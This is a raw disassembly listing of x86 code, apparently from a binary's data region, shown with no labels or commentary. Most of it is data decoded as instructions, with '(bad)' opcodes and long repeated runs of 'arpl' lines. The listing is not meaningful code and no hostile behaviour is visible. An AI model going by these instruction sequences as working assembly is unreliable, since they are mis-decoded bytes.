  41d5b5:	cwde   
  41d5b6:	retf   0x73ef
  41d5b9:	mov    eax,DWORD PTR [eax-0x39d10bf5]
  41d5bf:	inc    DWORD PTR [edx]
  41d5c1:	cs dec ebp
  41d5c3:	mov    DWORD PTR [ecx],edx
  41d5c5:	pusha  
  41d5c6:	mov    edx,0xbab7a1f7
  41d5cb:	add    BYTE PTR ds:[eax-0x36],ah
  41d5cf:	test   DWORD PTR [ecx-0x7b47f8d],0x3e746e2
  41d5d9:	arpl   WORD PTR ds:0xba8f1589,ax
  41d5df:	add    BYTE PTR ds:[eax],al
	...
  41d5ee:	add    BYTE PTR [eax],al
  41d5f0:	pusha  
  41d5f1:	mov    edx,0xa66933f7
  41d5f6:	hlt    
  41d5f7:	push   ebp
  41d5f8:	and    al,BYTE PTR ds:0x7e6b4501
  41d5fe:	or     bl,ch
  41d600:	adc    al,0x7e
  41d602:	sub    esp,esp
  41d604:	scas   al,BYTE PTR es:[edi]
  41d605:	(bad)  
  41d606:	dec    DWORD PTR [eax+0x4153658e]
  41d60c:	arpl   WORD PTR [eax],bx
  41d60e:	(bad)  
  41d60f:	mov    DWORD PTR [esi+0x2d],esi
  41d612:	push   ebx
  41d613:	inc    ecx
  41d614:	arpl   WORD PTR [eax],bx
  41d616:	(bad)  
  41d617:	mov    DWORD PTR [esi+0x61],ecx
  41d61a:	push   ebx
  41d61b:	inc    ecx
  41d61c:	arpl   WORD PTR [ebp+0x4e],bx
  41d61f:	neg    DWORD PTR [esp+edx*2]
  41d622:	mov    ecx,DWORD PTR ds:0x3eba84
  41d628:	fcmovb st,st(1)
  41d62a:	idiv   DWORD PTR [ecx+0x400763]
  41d630:	loop   0x41d68f
  41d632:	add    BYTE PTR [edx],al
  41d634:	arpl   WORD PTR ds:0x1feb5589,ax
  41d63a:	iret   
  41d63b:	mov    DWORD PTR [esi+0x5d],ecx
  41d63e:	push   ebx
  41d63f:	inc    ecx
  41d640:	arpl   WORD PTR [esi+0x52255e8],sp
  41d646:	push   eax
  41d647:	call   0x3f25b3
  41d64c:	loopne 0x41d696
  41d64e:	add    al,0x8b
  41d650:	outs   dx,BYTE PTR ds:[esi]
  41d651:	pop    ecx
  41d652:	push   ebx
  41d653:	inc    ecx
	...
  41d660:	add    BYTE PTR [eax],al
  41d662:	add    BYTE PTR [ebx-0x4a],ah
  41d665:	out    0xd5,eax
  41d667:	test   eax,0xa385fd53
  41d66c:	fld    DWORD PTR [ebx]
  41d66e:	xor    esp,DWORD PTR [ebx+0x3e8b2a5f]
  41d674:	imul   edx,DWORD PTR [ebx+0x41],0x4c48863
  41d67b:	loopne 0x41d68e
  41d67d:	clc    
  41d67e:	push   ebp
  41d67f:	and    al,BYTE PTR ds:0xa66a7400
  41d685:	aam    0x55
  41d687:	and    al,BYTE PTR ds:0x93f4487
  41d68d:	call   0xfd9534ef
  41d692:	mov    ebp,DWORD PTR [esi-0x7]
  41d695:	push   ebp
  41d696:	inc    ecx
  41d697:	arpl   WORD PTR [edi+0x7f2333c0],si
  41d69d:	jecxz  0x41d6fc
  41d69f:	and    BYTE PTR [edx-0x34],al
  41d6a2:	int3   
  41d6a3:	arpl   WORD PTR ds:0x5630000,ax
  41d6a9:	add    BYTE PTR [eax],al
  41d6ab:	arpl   WORD PTR ds:0x5630000,ax
  41d6b1:	add    BYTE PTR [eax],al
  41d6b3:	arpl   WORD PTR ds:0x5630000,ax
  41d6b9:	add    BYTE PTR [eax],al
  41d6bb:	arpl   WORD PTR ds:0x5630000,ax
  41d6c1:	add    BYTE PTR [eax],al
  41d6c3:	arpl   WORD PTR ds:0x0,ax
	...
  41d6d5:	add    BYTE PTR [ebx+0x5],ah
  41d6d8:	add    BYTE PTR [eax],al
  41d6da:	arpl   WORD PTR ds:0x5630000,ax
  41d6e0:	add    BYTE PTR [eax],al
  41d6e2:	arpl   WORD PTR ds:0x5630000,ax
  41d6e8:	add    BYTE PTR [eax],al
  41d6ea:	arpl   WORD PTR ds:0x5630000,ax
  41d6f0:	add    BYTE PTR [eax],al
  41d6f2:	arpl   WORD PTR ds:0x5630000,ax
  41d6f8:	add    BYTE PTR [eax],al
  41d6fa:	arpl   WORD PTR ds:0x5630000,ax
  41d700:	add    BYTE PTR [eax],al
  41d702:	arpl   WORD PTR ds:0x5630000,ax
  41d708:	add    BYTE PTR [eax],al
  41d70a:	arpl   WORD PTR ds:0x5630000,ax
  41d710:	add    BYTE PTR [eax],al
  41d712:	arpl   WORD PTR ds:0x5630000,ax
  41d718:	add    BYTE PTR [eax],al
  41d71a:	arpl   WORD PTR ds:0x5630000,ax
  41d720:	add    BYTE PTR [eax],al
  41d722:	arpl   WORD PTR ds:0x5630000,ax
  41d728:	add    BYTE PTR [eax],al
  41d72a:	arpl   WORD PTR ds:0x5630000,ax
  41d730:	add    BYTE PTR [eax],al
  41d732:	arpl   WORD PTR ds:0x5630000,ax
	...
  41d748:	add    BYTE PTR [ebx+0x5],ah
  41d74b:	add    BYTE PTR [eax],al
  41d74d:	arpl   WORD PTR ds:0x5630000,ax
  41d753:	add    BYTE PTR [eax],al
  41d755:	arpl   WORD PTR ds:0x5630000,ax
  41d75b:	add    BYTE PTR [eax],al
  41d75d:	arpl   WORD PTR ds:0x5630000,ax
  41d763:	add    BYTE PTR [eax],al
  41d765:	arpl   WORD PTR ds:0x5630000,ax
  41d76b:	add    BYTE PTR [eax],al
  41d76d:	arpl   WORD PTR ds:0x5630000,ax
  41d773:	add    BYTE PTR [eax],al
  41d775:	arpl   WORD PTR ds:0x5630000,ax
  41d77b:	add    BYTE PTR [eax],al
  41d77d:	arpl   WORD PTR ds:0x5630000,ax
  41d783:	add    BYTE PTR [eax],al
  41d785:	arpl   WORD PTR ds:0x5630000,ax
  41d78b:	add    BYTE PTR [eax],al
  41d78d:	arpl   WORD PTR ds:0x5630000,ax
  41d793:	add    BYTE PTR [eax],al
  41d795:	arpl   WORD PTR ds:0x5630000,ax
  41d79b:	add    BYTE PTR [eax],al
  41d79d:	arpl   WORD PTR ds:0x5630000,ax
  41d7a3:	add    BYTE PTR [eax],al
  41d7a5:	arpl   WORD PTR ds:0x5630000,ax
	...
  41d7bb:	add    BYTE PTR [ebx+0x5],ah
  41d7be:	add    BYTE PTR [eax],al
  41d7c0:	arpl   WORD PTR ds:0x5630000,ax
  41d7c6:	add    BYTE PTR [eax],al
  41d7c8:	arpl   WORD PTR ds:0x5630000,ax
  41d7ce:	add    BYTE PTR [eax],al
  41d7d0:	arpl   WORD PTR ds:0x5630000,ax
  41d7d6:	add    BYTE PTR [eax],al
  41d7d8:	arpl   WORD PTR ds:0x5630000,ax
  41d7de:	add    BYTE PTR [eax],al
  41d7e0:	arpl   WORD PTR ds:0x5630000,ax
  41d7e6:	add    BYTE PTR [eax],al
  41d7e8:	arpl   WORD PTR ds:0x5630000,ax
  41d7ee:	add    BYTE PTR [eax],al
  41d7f0:	arpl   WORD PTR ds:0x5630000,ax
  41d7f6:	add    BYTE PTR [eax],al
  41d7f8:	arpl   WORD PTR ds:0x5630000,ax
  41d7fe:	add    BYTE PTR [eax],al
  41d800:	arpl   WORD PTR ds:0x5630000,ax
  41d806:	add    BYTE PTR [eax],al
  41d808:	arpl   WORD PTR ds:0x5630000,ax
  41d80e:	add    BYTE PTR [eax],al
  41d810:	arpl   WORD PTR ds:0x5630000,ax
  41d816:	add    BYTE PTR [eax],al
  41d818:	arpl   WORD PTR ds:0x2000000,ax
  41d81e:	add    BYTE PTR [eax],al
  41d820:	arpl   WORD PTR ds:0x57b0000,ax
  41d826:	add    BYTE PTR [eax],al
  41d828:	fbstp  TBYTE PTR [edi]
  41d82a:	nop
  41d82b:	xor    ch,bh
  41d82d:	aaa    
  41d82e:	cwde   
  41d82f:	xor    bl,bh
  41d831:	aaa    
  41d832:	mov    al,ds:0xa837bf32
  41d837:	xor    ah,BYTE PTR [ebx+0x45]
  41d83a:	add    DWORD PTR [eax],eax
  41d83c:	adc    eax,DWORD PTR ds:0x3f400000
  41d842:	dec    ebx
  41d843:	cmp    esi,DWORD PTR [ebx-0x53c4a5c2]
  41d849:	ds push 0x933eb53b
  41d84f:	cmp    ebx,ebp
  41d851:	cmp    eax,0x3e1f3ba8
  41d856:	in     eax,dx
  41d857:	cmp    ebx,DWORD PTR [eax+0x39]
  41d85a:	adc    DWORD PTR [edx+ecx*2],edi
  41d85d:	cmp    DWORD PTR [ebp-0x78c838c4],ebx
  41d863:	ds out 0x3a,al
  41d866:	xchg   ebp,eax
  41d867:	ds daa 
  41d869:	cmp    ecx,ebp
  41d86b:	ds cld 
  41d86d:	cmp    bh,BYTE PTR [esi+0x3f]
  41d870:	loopne 0x41d8ab
  41d872:	fwait
  41d873:	aas    
  41d874:	retf   0xaf39
  41d877:	aas    
  41d878:	lods   al,BYTE PTR ds:[esi]
  41d879:	cmp    esp,ecx
  41d87b:	aas    
  41d87c:	adc    DWORD PTR [edx],edi
  41d87e:	out    0x3f,al
  41d880:	sar    BYTE PTR [ecx],cl
  41d882:	stc    
  41d883:	aas    
	...
  41d890:	add    BYTE PTR [eax],al
  41d892:	add    ah,dl
  41d894:	cmp    DWORD PTR [eax],eax
  41d896:	add    BYTE PTR [ebx+0x55],ah
  41d899:	add    DWORD PTR [eax],eax
  41d89b:	syscall 
  41d89d:	add    BYTE PTR [eax],al
  41d89f:	xor    ax,0x3018
  41d8a3:	loop   0x41d8d9
  41d8a5:	xchg   DWORD PTR [eax],esi
  41d8a7:	and    eax,0x6314b34
  41d8ac:	xor    al,0x66
  41d8ae:	xor    DWORD PTR [ebx],edx
  41d8b0:	xor    al,0x8d
  41d8b2:	xor    DWORD PTR [edi-0x5ece55cd],edi
  41d8b8:	xor    esp,ecx
  41d8ba:	xor    DWORD PTR [ebp+0x37],edx
  41d8bd:	pop    ss
  41d8be:	xor    bl,BYTE PTR [edi+0x37]
  41d8c1:	and    esi,DWORD PTR [edx]
  41d8c3:	cmp    dh,BYTE PTR [edi]
  41d8c5:	inc    edx
  41d8c6:	xor    bl,BYTE PTR [ebx]
  41d8c8:	aaa    
  41d8c9:	push   ecx
  41d8ca:	xor    cl,BYTE PTR [edi+esi*1]
  41d8cd:	pop    esi
  41d8ce:	xor    cl,dh
  41d8d0:	xor    edi,DWORD PTR [ebp+0x32]
  41d8d3:	loope  0x41d908
  41d8d5:	xchg   esp,eax
  41d8d6:	xor    ch,dh
  41d8d8:	xor    esp,DWORD PTR [edi-0x3dcbf2ce]
  41d8de:	xor    dl,BYTE PTR [ebx]
  41d8e0:	xor    al,0x8
  41d8e2:	xor    esp,DWORD PTR [ebp+0x34]
  41d8e5:	adc    al,0x33
  41d8e7:	xchg   BYTE PTR [edx+ebp*1],dh
  41d8ea:	xor    esp,DWORD PTR [ecx-0x14cc81cc]
  41d8f0:	xor    al,0x95
  41d8f2:	xor    eax,edx
  41d8f4:	xor    al,0xab
  41d8f6:	xor    eax,DWORD PTR [eax]
	...
  41d904:	add    BYTE PTR [eax],al
  41d906:	xlat   BYTE PTR ds:[ebx]
  41d907:	xor    al,0xbe
  41d909:	xor    ebx,DWORD PTR [edx]
  41d90b:	xor    eax,0x351733ce
  41d910:	fnsave [ebx]
  41d912:	add    al,0x35
  41d914:	hlt    
  41d915:	xor    ebp,ecx
  41d917:	xor    al,0xff
  41d919:	xor    ebx,DWORD PTR [esi+0x31]
  41d91c:	or     DWORD PTR [ebp*2-0x7ecbebcf],esi
  41d923:	xor    DWORD PTR [eax],ebp
  41d925:	xor    al,0x7e
  41d927:	xor    DWORD PTR [edx],esi
  41d929:	xor    al,0x14
  41d92b:	xor    DWORD PTR [edx+0x34],ebx
  41d92e:	in     eax,0x31
  41d930:	mov    WORD PTR [ecx+edx*8],?
  41d933:	xor    DWORD PTR [esp+esi*1+0x34eb31a5],ebx
  41d93a:	stos   DWORD PTR es:[edi],eax
  41d93b:	xor    DWORD PTR [esi*1+0x35233275],ecx
  41d942:	dec    edx
  41d943:	xor    dh,BYTE PTR [ecx]
  41d945:	xor    eax,0x3544324a
  41d94a:	pop    ss
  41d94b:	xor    bl,BYTE PTR [ebp+0x35]
  41d94e:	add    DWORD PTR [edx],esi
  41d950:	jno    0x41d987
  41d952:	fidiv  WORD PTR [edx]
  41d954:	mov    ?,WORD PTR ds:0x35a532d5
  41d95a:	arpl   WORD PTR ds:0x5630000,ax
  41d960:	add    BYTE PTR [eax],al
  41d962:	arpl   WORD PTR ds:0x5630000,ax
	...
  41d978:	add    BYTE PTR [ebx+0x5],ah
  41d97b:	add    BYTE PTR [eax],al
  41d97d:	arpl   WORD PTR ds:0x5630000,ax
  41d983:	add    BYTE PTR [eax],al
  41d985:	arpl   WORD PTR ds:0x5630000,ax
  41d98b:	add    BYTE PTR [eax],al
  41d98d:	arpl   WORD PTR ds:0x5630000,ax
  41d993:	add    BYTE PTR [eax],al
  41d995:	arpl   WORD PTR ds:0x5630000,ax
  41d99b:	add    BYTE PTR [eax],al
  41d99d:	arpl   WORD PTR ds:0x5630000,ax
  41d9a3:	add    BYTE PTR [eax],al
  41d9a5:	arpl   WORD PTR ds:0x5630000,ax
  41d9ab:	add    BYTE PTR [eax],al
  41d9ad:	arpl   WORD PTR ds:0x5630000,ax
  41d9b3:	add    BYTE PTR [eax],al
  41d9b5:	arpl   WORD PTR ds:0x5630000,ax
  41d9bb:	add    BYTE PTR [eax],al
  41d9bd:	arpl   WORD PTR ds:0x5630000,ax
  41d9c3:	add    BYTE PTR [eax],al
  41d9c5:	arpl   WORD PTR ds:0x5630000,ax
  41d9cb:	add    BYTE PTR [eax],al
  41d9cd:	arpl   WORD PTR ds:0x5630000,ax
  41d9d3:	add    BYTE PTR [eax],al
  41d9d5:	arpl   WORD PTR ds:0x5630000,ax
	...
  41d9eb:	add    BYTE PTR [ebx+0x5],ah
  41d9ee:	add    BYTE PTR [eax],al
  41d9f0:	arpl   WORD PTR ds:0x5630000,ax
  41d9f6:	add    BYTE PTR [eax],al
  41d9f8:	arpl   WORD PTR ds:0x5630000,ax
  41d9fe:	add    BYTE PTR [eax],al
  41da00:	arpl   WORD PTR ds:0x5630000,ax
  41da06:	add    BYTE PTR [eax],al
  41da08:	arpl   WORD PTR ds:0x5630000,ax
  41da0e:	add    BYTE PTR [eax],al
  41da10:	arpl   WORD PTR ds:0x5630000,ax
  41da16:	add    BYTE PTR [eax],al
  41da18:	arpl   WORD PTR ds:0x5630000,ax
  41da1e:	add    BYTE PTR [eax],al
  41da20:	arpl   WORD PTR ds:0x5630000,ax
  41da26:	add    BYTE PTR [eax],al
  41da28:	arpl   WORD PTR ds:0x5630000,ax
  41da2e:	add    BYTE PTR [eax],al
  41da30:	arpl   WORD PTR ds:0x5630000,ax
  41da36:	add    BYTE PTR [eax],al
  41da38:	arpl   WORD PTR ds:0x5630000,ax
  41da3e:	add    BYTE PTR [eax],al
  41da40:	arpl   WORD PTR ds:0x5630000,ax
  41da46:	add    BYTE PTR [eax],al
  41da48:	arpl   WORD PTR ds:0x5630000,ax
	...
  41da5e:	add    BYTE PTR [ebx+0x5],ah
  41da61:	add    BYTE PTR [eax],al
  41da63:	arpl   WORD PTR ds:0x5630000,ax
	...
